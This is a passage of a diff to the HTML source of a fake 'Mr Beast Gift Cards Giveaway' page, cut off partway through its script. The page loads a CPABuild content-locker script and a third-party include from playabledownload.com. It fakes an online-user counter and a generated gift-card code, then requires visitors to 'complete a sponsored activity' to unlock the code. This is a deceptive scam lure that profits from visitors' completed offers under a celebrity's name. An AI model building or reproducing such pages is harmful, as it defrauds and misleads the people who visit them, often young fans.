@@ -1,529 +1,483 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mr Beast · Gift Cards Giveaway</title>
-    <!-- Fonts & Styles -->
+    <title>Mr Beast Gift Cards Giveaway</title>
+    <meta name="description" content="Mr Beast Gift Cards Giveaway"/>
+    <meta property="og:title" content="Mr Beast Gift Cards Giveaway"/>
+    <meta property="og:description" content="Mr Beast Gift Cards Giveaway"/>
+    <meta name="referrer" content="no-referrer">
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Concert+One&family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <!-- CPABuild Locker Script (keep) -->
+    <link href="https://fonts.googleapis.com/css2?family=Concert+One&display=swap" rel="stylesheet">
+    
+    <!-- CPABuild Locker Script -->
     <script type="text/javascript">
         var DTmJS_vOj_IiQiyc={"it":4611554,"key":"fdbb0"};
     </script>
     <script src="https://d1g1lhd4vferpn.cloudfront.net/948283e.js"></script>
+    
     <style>
-        /* ----- reset & base ----- */
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:300;
+            src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");
+            unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:300;
+            src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");
+            unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:500;
+            src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");
+            unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:500;
+            src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");
+            unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
-        body {
-            background: #0b0f1a;
-            font-family: 'Inter', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px 16px 40px;
-            color: #f0f4fc;
-            position: relative;
-        }
-        /* animated blob background (soft) */
-        body::before {
-            content: '';
-            position: fixed;
-            top: -30%;
-            left: -20%;
-            width: 140%;
-            height: 140%;
-            background: radial-gradient(circle at 30% 40%, #2b1f4e, #0f1422 70%);
-            z-index: -2;
-        }
-        .glow-orb {
-            position: fixed;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(155, 93, 229, 0.25), transparent 70%);
-            top: -150px;
-            right: -150px;
-            z-index: -1;
-            animation: floatGlow 18s infinite alternate ease-in-out;
-        }
-        .glow-orb2 {
-            position: fixed;
-            width: 500px;
-            height: 500px;
-            background: radial-gradient(circle, rgba(0, 187, 249, 0.2), transparent 70%);
-            bottom: -100px;
-            left: -100px;
-            z-index: -1;
-            animation: floatGlow 22s infinite alternate-reverse ease-in-out;
-        }
-        @keyframes floatGlow {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(40px, 30px) scale(1.2); }
-        }
-
-        /* ----- typography & cards ----- */
-        .brand {
             font-family: 'Concert One', cursive;
-            font-size: 2.4rem;
-            letter-spacing: 2px;
-            background: linear-gradient(135deg, #f7e05e, #f9b042);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(247, 224, 94, 0.3);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            margin-top: 6px;
         }
-        .brand img {
-            width: 50px;
-            filter: drop-shadow(0 0 10px #f9b04288);
+        
+        body {
+            margin: 0;
+            font-family: 'Concert One', cursive;
+            color: #444;
+            place-items: center;
+            scroll-behavior: smooth;
+            background-color: #00acd2;
+            z-index: -1;
         }
-        .sub-brand {
-            font-size: 0.9rem;
-            background: rgba(255,255,255,0.06);
-            padding: 6px 18px;
-            border-radius: 40px;
-            letter-spacing: 2px;
-            color: #b9c8f0;
-            border: 1px solid rgba(255,255,255,0.05);
-            backdrop-filter: blur(4px);
-            margin-top: -6px;
-        }
-
-        /* status bar – premium */
-        .status-bar {
-            background: rgba(10, 14, 30, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 60px;
-            padding: 12px 28px;
-            margin: 16px 0 24px;
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: #bccdf5;
-            display: inline-flex;
-            align-items: center;
-            gap: 18px;
-            flex-wrap: wrap;
-            justify-content: center;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
-        }
-        .status-bar span {
-            color: #b7f0b1;
-            font-weight: 700;
-        }
-        .status-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #50e55a;
-            border-radius: 50%;
-            margin-right: 4px;
-            box-shadow: 0 0 12px #50e55a88;
-            animation: pulse-dot 1.6s infinite;
-        }
-        @keyframes pulse-dot {
-            0% { opacity: 0.6; transform: scale(0.9); }
-            50% { opacity: 1; transform: scale(1.2); }
-            100% { opacity: 0.6; transform: scale(0.9); }
-        }
-
-        /* gift card grid */
-        .card-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(84px, 1fr));
-            gap: 12px;
-            max-width: 780px;
-            width: 100%;
-            margin: 20px auto 30px;
-            padding: 18px 16px;
-            background: rgba(12, 17, 34, 0.6);
-            backdrop-filter: blur(8px);
-            border-radius: 40px;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 12px 48px rgba(0,0,0,0.5);
-        }
-        .card-item {
-            background: rgba(30, 40, 70, 0.4);
-            border-radius: 18px;
-            padding: 6px;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            border: 2px solid transparent;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .card-item img {
-            width: 100%;
-            max-width: 78px;
-            border-radius: 14px;
-            display: block;
-            transition: 0.2s;
-            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
-        }
-        .card-item:hover {
-            background: rgba(60, 80, 140, 0.5);
-            border-color: #7b8fd4;
-            transform: scale(1.02);
-        }
-        .card-item.selected {
-            border-color: #f9d342;
-            background: rgba(249, 211, 66, 0.15);
-            box-shadow: 0 0 30px rgba(249, 211, 66, 0.2);
-            transform: scale(1.02);
-        }
-
-        /* main action box */
-        .action-box {
-            max-width: 580px;
-            width: 100%;
-            background: rgba(16, 22, 44, 0.7);
-            backdrop-filter: blur(16px);
-            border-radius: 48px;
-            padding: 28px 24px 34px;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            margin-top: 6px;
-            transition: 0.3s;
+        
+        .header {
+            font-family: 'Concert One', cursive;
+            font-size: 30px;
+            color: #000;
             text-align: center;
+            text-transform: uppercase;
+            font-weight: 500;
         }
-        .selected-preview {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-bottom: 18px;
+        
+        .icon {
+            width: 200px;
+            font-family: 'Play', sans-serif;
         }
-        .selected-preview img {
-            width: 110px;
-            border-radius: 24px;
-            border: 3px solid #f9d342;
-            box-shadow: 0 0 40px rgba(249, 211, 66, 0.25);
-        }
-        .selected-label {
-            font-weight: 600;
-            color: #b9caf5;
-            letter-spacing: 0.5px;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: 16px 48px;
-            background: linear-gradient(135deg, #f9d342, #f5a623);
-            border: none;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 1.3rem;
-            color: #0b0f1a;
-            cursor: pointer;
-            transition: 0.25s;
-            box-shadow: 0 8px 28px rgba(249, 211, 66, 0.25);
-            letter-spacing: 0.8px;
-            font-family: 'Inter', sans-serif;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        .btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 12px 40px rgba(249, 211, 66, 0.4);
-            background: linear-gradient(135deg, #fce15a, #f5a623);
-        }
-        .btn-secondary {
-            background: rgba(255,255,255,0.06);
-            color: #d6e2ff;
-            box-shadow: none;
-            border: 1px solid rgba(255,255,255,0.1);
-            backdrop-filter: blur(4px);
-        }
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.12);
+        
+        .status-bar {
+            text-align: center;
+            font-family: 'Concert One', cursive;
+            font-size: 18px;
             color: #fff;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            padding: 10px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
-        .btn:disabled {
-            opacity: 0.5;
-            pointer-events: none;
-            filter: grayscale(0.6);
+        
+        .status-bar span {
+            color: #ffeb3b;
+            font-weight: bold;
         }
-
-        .gen-key-area {
-            background: rgba(0, 0, 0, 0.35);
-            border-radius: 40px;
-            padding: 18px 12px;
-            margin: 16px 0 10px;
-            font-family: 'Courier New', monospace;
-            font-size: 1.6rem;
-            letter-spacing: 4px;
-            color: #f0e68c;
-            border: 1px dashed rgba(255,215,0,0.3);
-            word-break: break-all;
+        
+        .showin {
+            animation: showin 0.5s;
+            animation-fill-mode: forwards;
         }
-        .gen-hint {
-            font-size: 0.9rem;
-            color: #99aedb;
-            background: rgba(0,0,0,0.2);
-            padding: 12px 16px;
-            border-radius: 30px;
-            margin: 12px 0 6px;
+        
+        @keyframes showin {
+            0% { transform: scale(0); }
+            30% { transform: scale(1); }
+            60% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
-
-        .hidden {
+        
+        input {
+            width: 320px;
+            text-align: center;
+            padding: 15px 0px;
+            border-radius: 5px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .appbox1 {
+            max-width: 600px;
+            background: rgba(0, 0, 0, 0.664);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            margin: auto;
+            border: #333 solid 5px;
+            border-radius: 15px;
+            padding: 10px;
+            z-index: 99;
+        }
+        
+        .appbox {
+            background: rgba(0, 0, 0, 0.507);
+            border: whitesmoke solid 5px;
+            display: flex;
+            flex-wrap: wrap;
+            text-align: center;
+            max-width: 95%;
+            margin: auto;
+            margin-top: 10px;
+            border-radius: 15px;
+            padding: 5px;
+            padding-bottom: 25px;
+            padding-top: 25px;
+            text-decoration: none;
+        }
+        
+        .appbox a {
+            text-decoration: none;
+        }
+        
+        .iconimg {
+            max-width: 130px;
+            cursor: pointer;
+            border-radius: 10px;
+            margin: 10px;
+            box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+        }
+        
+        .iconimg:hover {
+            background-color: #333;
+            border: #fff solid 5px;
+            transform: scale(1.1);
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+            text-decoration: none;
+        }
+        
+        .selectedcard {
+            background-color: #333;
+            border: #fff solid 5px;
+            transform: scale(1.2);
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+        }
+        
+        .button {
+            cursor: pointer;
+            display: block;
+            max-width: 300px;
+            width: 90%;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 4px solid #0069d9;
+            background: #0069d9;
+            color: #fff;
+            border-radius: 15px;
+            padding: 25px 40px;
+            margin: 15px auto;
+            z-index: 99;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 2px;
+        }
+        
+        .button:hover {
+            border-color: #065cb8;
+            background: #065cb8;
+            transform: scale(1.05);
+        }
+        
+        .showiconimg {
+            max-width: 180px;
+            border-radius: 10px;
+            border: #fff solid 5px;
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+        }
+        
+        .text1 {
+            display: block;
+            font-size: 20px;
+            position: relative;
+            z-index: 10000;
+            max-width: 90%;
+            color: #fff;
+            font-family: 'Play', sans-serif;
+            border-radius: 10px;
+            text-align: center;
+            width: 100%;
+            padding: 5px;
+            margin: auto;
+            margin-top: 5px;
+        }
+        
+        #Gentext {
+            font-family: 'Courier New', Courier, monospace;
+            max-width: 350px;
+            margin: auto;
+            border-radius: 10px;
+            background-color: #fff;
+            padding: 10px 20px;
+            color: #000;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            letter-spacing: 3px;
+            font-weight: bold;
+        }
+        
+        #Gentext1 {
+            color: #fff;
+        }
+        
+        .Gen-Text {
+            font-family: 'Play', sans-serif;
+            font-size: 20px;
+            margin: 20px;
+        }
+        
+        #google_translate_element {
+            padding: 10px;
+        }
+        
+        svg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            z-index: -1;
+        }
+        
+        /* Header hide class */
+        .header-hidden {
             display: none !important;
         }
-
-        /* responsive */
-        @media (max-width: 600px) {
-            .brand { font-size: 1.8rem; }
-            .card-grid { grid-template-columns: repeat(auto-fill, minmax(64px, 1fr)); gap: 8px; padding: 12px; }
-            .action-box { padding: 20px 12px; }
-            .btn { padding: 14px 32px; font-size: 1.1rem; }
-            .gen-key-area { font-size: 1.2rem; letter-spacing: 2px; }
-        }
-
-        /* google translate tweak */
-        #google_translate_element {
-            margin-bottom: 6px;
-            opacity: 0.7;
-            transition: 0.2s;
-        }
-        #google_translate_element:hover { opacity: 1; }
-
-        /* lock script fallback */
-        .cpabuild-locker {
-            margin-top: 12px;
+        
+        /* Mobile fix - ek line mein rakho */
+        @media (max-width: 768px) {
+            .status-bar {
+                font-size: 14px;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                padding: 8px 5px;
+            }
+            
+            .button {
+                font-size: 20px;
+                padding: 20px 30px;
+                max-width: 280px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Glow orbs -->
-    <div class="glow-orb"></div>
-    <div class="glow-orb2"></div>
 
-    <!-- Translate -->
-    <div id="google_translate_element"></div>
+    <center>
+        <div id="google_translate_element"></div>
+    </center>
 
-    <!-- Header -->
-    <div id="header" class="brand">
-        <img src="https://d266key948fg17.cloudfront.net/uploads/1678361332af23ddeeafd54eb78d7951d71bb13a42.png" alt="Mr Beast">
-        <span>GIFT CARD</span>
-        <span style="font-size: 0.7em; background: #f9d34222; padding: 0 12px; border-radius: 40px; color: #f9d342;">GIVEAWAY</span>
+    <svg preserveAspectRatio="xMidYMid slice" viewBox="10 10 80 80">
+        <defs>
+            <style>
+                @keyframes rotate {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                .out-top {
+                    animation: rotate 20s linear infinite;
+                    transform-origin: 13px 25px;
+                }
+                .in-top {
+                    animation: rotate 10s linear infinite;
+                    transform-origin: 13px 25px;
+                }
+                .out-bottom {
+                    animation: rotate 25s linear infinite;
+                    transform-origin: 84px 93px;
+                }
+                .in-bottom {
+                    animation: rotate 15s linear infinite;
+                    transform-origin: 84px 93px;
+                }
+            </style>
+        </defs>
+        <path fill="#9b5de5" class="out-top" d="M37-5C25.1-14.7,5.7-19.1-9.2-10-28.5,1.8-32.7,31.1-19.8,49c15.5,21.5,52.6,22,67.2,2.3C59.4,35,53.7,8.5,37-5Z" />
+        <path fill="#f15bb5" class="in-top" d="M20.6,4.1C11.6,1.5-1.9,2.5-8,11.2-16.3,23.1-8.2,45.6,7.4,50S42.1,38.9,41,24.5C40.2,14.1,29.4,6.6,20.6,4.1Z" />
+        <path fill="#00bbf9" class="out-bottom" d="M105.9,48.6c-12.4-8.2-29.3-4.8-39.4.8-23.4,12.8-37.7,51.9-19.1,74.1s63.9,15.3,76-5.6c7.6-13.3,1.8-31.1-2.3-43.8C117.6,63.3,114.7,54.3,105.9,48.6Z" />
+        <path fill="#00f5d4" class="in-bottom" d="M102,67.1c-9.6-6.1-22-3.1-29.5,2-15.4,10.7-19.6,37.5-7.6,47.8s35.9,3.9,44.5-12.5C115.5,92.6,113.9,74.6,102,67.1Z" />
+    </svg>
+
+    <div id="header" class="header">
+        <img src="https://d266key948fg17.cloudfront.net/uploads/1678361332af23ddeeafd54eb78d7951d71bb13a42.png" class="icon">
+        <br>
+        <img src="https://d266key948fg17.cloudfront.net/uploads/16884397763708be1ecd6cf1de3893bcbaf16c9219.png" style="width: 25px;">
+        <br>GIFT CARD GIVEAWAY
     </div>
-    <div class="sub-brand">✨ pick your card · claim instantly</div>
 
-    <!-- Status Bar -->
+    <!-- User Online Status Bar - Single Line PC & Mobile -->
     <div class="status-bar">
-        <span><span class="status-dot"></span> <span id="user-online">294</span> online</span>
-        <span>|</span>
-        <span>🕒 updated <span id="update-date">Jun 07 2026</span></span>
+        User Online: <span id="user-online">294</span> | Last update: <span id="update-date">Jun 07 2026</span>
     </div>
 
-    <!-- Card Grid -->
-    <div class="card-grid" id="appbox">
-        <!-- 44 cards generated with JS to keep HTML clean -->
-    </div>
+    <div id="download" style="display: none; margin-top: 20px;" class="appbox1">
+        <div><img src=" " id="imggen" class="showiconimg"></div>
+        <div style="display: none;" class="Gen-Text" id="Gentext"></div>
+        <div style="display: none;" class="Gen-Text" id="Gentext1">Complete a sponsored activity to unlock the final code. This will help pay for your card.</div>
 
-    <!-- Action Box -->
-    <div class="action-box" id="download" style="display: none;">
-        <div class="selected-preview">
-            <img src="" id="imggen" alt="selected card">
-            <div>
-                <div class="selected-label">✨ selected card</div>
-                <div style="font-size: 0.8rem; color: #8ea3d4;">click any card above</div>
-            </div>
+        <!-- Verify Button - Bigger & Thicker -->
+        <div style="display: none;" class="button" id="button1" onclick="_bC()">
+            Verify
         </div>
 
-        <!-- step 1: get now -->
+        <!-- STEP 1: Get Now button shows first -->
         <div id="step1">
-            <div style="font-weight: 500; color: #c2d2fc; margin-bottom: 10px;">🎁 your gift card is ready</div>
-            <button class="btn" id="button" onclick="showGenStep()"> Get Now </button>
-        </div>
-
-        <!-- step 2: key generator + verify -->
-        <div id="step2" class="hidden">
-            <div class="gen-key-area" id="Gentext"></div>
-            <div class="gen-hint" id="Gentext1">Complete a sponsored activity to unlock the final code.</div>
-            <button class="btn btn-secondary" id="button1" onclick="_bC()" style="display: none; margin-top: 12px;">🔓 Verify & Reveal</button>
+            <div class="text1">Here is your gift card!</div>
+            <div class="button" id="button" onclick="showGenStep()"> Get Now! </div>
         </div>
     </div>
 
-    <!-- CPABuild locker include (keep) -->
-    <div style="height: 0; overflow: hidden; opacity: 0;">.</div>
+    <div class="appbox" id="appbox">
+        <a href="#header">
+            <img onclick="card(1)" src="https://d266key948fg17.cloudfront.net/uploads/168351558560a555c5564b1d3786b74d9ef861a760.png" class="iconimg" id="card1">
+            <img onclick="card(2)" src="https://d266key948fg17.cloudfront.net/uploads/16835155878748b3ee2e78d26f67f8a25ffdccbacc.png" class="iconimg" id="card2">
+            <img onclick="card(3)" src="https://d266key948fg17.cloudfront.net/uploads/16888819910ba9f8c460a03d8dc543a8e9c788b311.png" class="iconimg" id="card3">
+            <img onclick="card(4)" src="https://d266key948fg17.cloudfront.net/uploads/16835162124327c5dd85b75f93ac5b40d83f7a0fc7.png" class="iconimg" id="card4">
+            <img onclick="card(5)" src="https://d266key948fg17.cloudfront.net/uploads/168351558813755e89e3f453a0ddc7fe24df7c8ff3.png" class="iconimg" id="card5">
+            <img onclick="card(6)" src="https://d266key948fg17.cloudfront.net/uploads/1683515587d7137bdf5e6ef50a1b25500a4729490f.png" class="iconimg" id="card6">
+            <img onclick="card(7)" src="https://d266key948fg17.cloudfront.net/uploads/1683515586bb993477f94e1a2cb20d215d6bc40809.png" class="iconimg" id="card7">
+            <img onclick="card(8)" src="https://d266key948fg17.cloudfront.net/uploads/168351558787a27e0fb81f743e6ed8a241ee9b27e4.png" class="iconimg" id="card8">
+            <img onclick="card(9)" src="https://d266key948fg17.cloudfront.net/uploads/1683515586181c716e649e0de5204b5d7537669473.png" class="iconimg" id="card9">
+            <img onclick="card(10)" src="https://d266key948fg17.cloudfront.net/uploads/16835155892ec64137df5b248ab76c47e25694999a.png" class="iconimg" id="card10">
+            <img onclick="card(11)" src="https://d266key948fg17.cloudfront.net/uploads/16835155851a4468a359a9cb675ea185fcf71ab6d8.png" class="iconimg" id="card11">
+            <img onclick="card(12)" src="https://d266key948fg17.cloudfront.net/uploads/16835155847d885a68fbf01c3c98d346efa14d0a3c.png" class="iconimg" id="card12">
+            <img onclick="card(13)" src="https://d266key948fg17.cloudfront.net/uploads/1683515584aa0d151a43729454454784dfd0e78ed8.png" class="iconimg" id="card13">
+            <img onclick="card(14)" src="https://d266key948fg17.cloudfront.net/uploads/1683515584d23f7cda78a87917d071cfdcd80cd2a6.png" class="iconimg" id="card14">
+            <img onclick="card(15)" src="https://d266key948fg17.cloudfront.net/uploads/1683515583c80a90818f98dd5b530d7658c670b29f.png" class="iconimg" id="card15">
+            <img onclick="card(16)" src="https://d266key948fg17.cloudfront.net/uploads/168351558269416cf617bfe6668e55ad8db023750d.png" class="iconimg" id="card16">
+            <img onclick="card(17)" src="https://d266key948fg17.cloudfront.net/uploads/16835155821ce0b5e8da2485a766e01438af4c98cf.png" class="iconimg" id="card17">
+            <img onclick="card(18)" src="https://d266key948fg17.cloudfront.net/uploads/1683515582188f681dceb4d54bb0ca2a44ecc5ae2e.png" class="iconimg" id="card18">
+            <img onclick="card(19)" src="https://d266key948fg17.cloudfront.net/uploads/1683515580ffc9bf439ab9a1b6927ce97463eb2883.png" class="iconimg" id="card19">
+            <img onclick="card(20)" src="https://d266key948fg17.cloudfront.net/uploads/1683515581c543e9517e74262f450f0d5c3c8a40d2.png" class="iconimg" id="card20">
+            <img onclick="card(21)" src="https://d266key948fg17.cloudfront.net/uploads/1683515581a1481b807a7aeaa03ec0d01cee167cc2.png" class="iconimg" id="card21">
+            <img onclick="card(22)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579c0063555d35f573fa6a19c893cd3b1fc.png" class="iconimg" id="card22">
+            <img onclick="card(23)" src="https://d266key948fg17.cloudfront.net/uploads/168351558018d0f22b2a201cafa7446c84ebca10bd.png" class="iconimg" id="card23">
+            <img onclick="card(24)" src="https://d266key948fg17.cloudfront.net/uploads/16835155804025a27ee677a002e9b9a9d00e60c803.png" class="iconimg" id="card24">
+            <img onclick="card(25)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579e9cef2557aa62295863fe0cc259ec90a.png" class="iconimg" id="card25">
+            <img onclick="card(26)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579b8f11cac60402fdfe438578c3bdc9519.png" class="iconimg" id="card26">
+            <img onclick="card(27)" src="https://d266key948fg17.cloudfront.net/uploads/16835155786f1b9ae97f0444022e99030b7660bb7d.png" class="iconimg" id="card27">
+            <img onclick="card(28)" src="https://d266key948fg17.cloudfront.net/uploads/1683515577114fea203a24b08e7d746276dad9e428.png" class="iconimg" id="card28">
+            <img onclick="card(29)" src="https://d266key948fg17.cloudfront.net/uploads/1683515578dc7bf3e6a1b096eb8992eaadef8c37fa.png" class="iconimg" id="card29">
+            <img onclick="card(30)" src="https://d266key948fg17.cloudfront.net/uploads/1683515577b67819cadd48b1796be797f19412a050.png" class="iconimg" id="card30">
+            <img onclick="card(31)" src="https://d266key948fg17.cloudfront.net/uploads/16835155776888048542b1aee83f60cada03b5e9fe.png" class="iconimg" id="card31">
+            <img onclick="card(32)" src="https://d266key948fg17.cloudfront.net/uploads/16835155766b7de6286253f9137b8a8017235f8ff9.png" class="iconimg" id="card32">
+            <img onclick="card(33)" src="https://d266key948fg17.cloudfront.net/uploads/16835155751ab0f5a98bc7d5e1e6deb62a607666ac.png" class="iconimg" id="card33">
+            <img onclick="card(34)" src="https://d266key948fg17.cloudfront.net/uploads/1683515576889384a64b3805cd83a49235578d0c84.png" class="iconimg" id="card34">
+            <img onclick="card(35)" src="https://d266key948fg17.cloudfront.net/uploads/1683515575f94e95b5fa567adfe83d22866a026691.png" class="iconimg" id="card35">
+            <img onclick="card(36)" src="https://d266key948fg17.cloudfront.net/uploads/16835155759bb03a1c8cd60dd03ce3c7cdfc3d5729.png" class="iconimg" id="card36">
+            <img onclick="card(37)" src="https://d266key948fg17.cloudfront.net/uploads/168351557414a549caf2272daa52328b3e9a887196.png" class="iconimg" id="card37">
+            <img onclick="card(38)" src="https://d266key948fg17.cloudfront.net/uploads/1683515574519de4f41af72361cdc267ddb04ea418.png" class="iconimg" id="card38">
+            <img onclick="card(39)" src="https://d266key948fg17.cloudfront.net/uploads/168351557317debab7cd0529195a1bd0f29aa07902.png" class="iconimg" id="card39">
+            <img onclick="card(40)" src="https://d266key948fg17.cloudfront.net/uploads/168351557339e3880a6a59b3ce405f9a101166b46a.png" class="iconimg" id="card40">
+            <img onclick="card(41)" src="https://d266key948fg17.cloudfront.net/uploads/1688881990e56e48dac9cfc02dcccbebcae8315b37.png" class="iconimg" id="card41">
+            <img onclick="card(42)" src="https://d266key948fg17.cloudfront.net/uploads/1688881988cd9bbe2303211f05f847dd99f8d9ffb9.png" class="iconimg" id="card42">
+            <img onclick="card(43)" src="https://d266key948fg17.cloudfront.net/uploads/1688881988d472c750c492bb306446f181d96b785d.png" class="iconimg" id="card43">
+            <img onclick="card(44)" src="https://d266key948fg17.cloudfront.net/uploads/1683515588d9add22281c8e75444fe5ae9fa465d51.png" class="iconimg" id="card44">
+        </a>
+    </div>
+
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1600536"></script>
 
     <script>
-        (function() {
-            // ----- generate 44 cards dynamically -----
-            const cardGrid = document.getElementById('appbox');
-            const baseUrl = 'https://d266key948fg17.cloudfront.net/uploads/';
-            // use the exact list from original (preserved)
-            const cardKeys = [
-                '168351558560a555c5564b1d3786b74d9ef861a760.png',
-                '16835155878748b3ee2e78d26f67f8a25ffdccbacc.png',
-                '16888819910ba9f8c460a03d8dc543a8e9c788b311.png',
-                '16835162124327c5dd85b75f93ac5b40d83f7a0fc7.png',
-                '168351558813755e89e3f453a0ddc7fe24df7c8ff3.png',
-                '1683515587d7137bdf5e6ef50a1b25500a4729490f.png',
-                '1683515586bb993477f94e1a2cb20d215d6bc40809.png',
-                '168351558787a27e0fb81f743e6ed8a241ee9b27e4.png',
-                '1683515586181c716e649e0de5204b5d7537669473.png',
-                '16835155892ec64137df5b248ab76c47e25694999a.png',
-                '16835155851a4468a359a9cb675ea185fcf71ab6d8.png',
-                '16835155847d885a68fbf01c3c98d346efa14d0a3c.png',
-                '1683515584aa0d151a43729454454784dfd0e78ed8.png',
-                '1683515584d23f7cda78a87917d071cfdcd80cd2a6.png',
-                '1683515583c80a90818f98dd5b530d7658c670b29f.png',
-                '168351558269416cf617bfe6668e55ad8db023750d.png',
-                '16835155821ce0b5e8da2485a766e01438af4c98cf.png',
-                '1683515582188f681dceb4d54bb0ca2a44ecc5ae2e.png',
-                '1683515580ffc9bf439ab9a1b6927ce97463eb2883.png',
-                '1683515581c543e9517e74262f450f0d5c3c8a40d2.png',
-                '1683515581a1481b807a7aeaa03ec0d01cee167cc2.png',
-                '1683515579c0063555d35f573fa6a19c893cd3b1fc.png',
-                '168351558018d0f22b2a201cafa7446c84ebca10bd.png',
-                '16835155804025a27ee677a002e9b9a9d00e60c803.png',
-                '1683515579e9cef2557aa62295863fe0cc259ec90a.png',
-                '1683515579b8f11cac60402fdfe438578c3bdc9519.png',
-                '16835155786f1b9ae97f0444022e99030b7660bb7d.png',
-                '1683515577114fea203a24b08e7d746276dad9e428.png',
-                '1683515578dc7bf3e6a1b096eb8992eaadef8c37fa.png',
-                '1683515577b67819cadd48b1796be797f19412a050.png',
-                '16835155776888048542b1aee83f60cada03b5e9fe.png',
-                '16835155766b7de6286253f9137b8a8017235f8ff9.png',
-                '16835155751ab0f5a98bc7d5e1e6deb62a607666ac.png',
-                '1683515576889384a64b3805cd83a49235578d0c84.png',
-                '1683515575f94e95b5fa567adfe83d22866a026691.png',
-                '16835155759bb03a1c8cd60dd03ce3c7cdfc3d5729.png',
-                '168351557414a549caf2272daa52328b3e9a887196.png',
